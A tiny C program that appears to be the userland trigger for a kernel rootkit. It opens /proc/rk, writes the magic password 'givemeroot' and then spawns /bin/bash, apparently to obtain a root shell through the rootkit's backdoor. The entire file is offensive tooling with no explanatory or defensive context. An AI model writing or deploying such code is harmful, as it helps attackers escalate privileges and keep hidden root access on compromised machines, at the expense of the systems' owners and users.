#include <fcntl.h>

int main(void)
{
	int fd = open("/proc/rk", O_WRONLY);
	write(fd, "givemeroot", 10);
	system("/bin/bash");

	return 0;
}
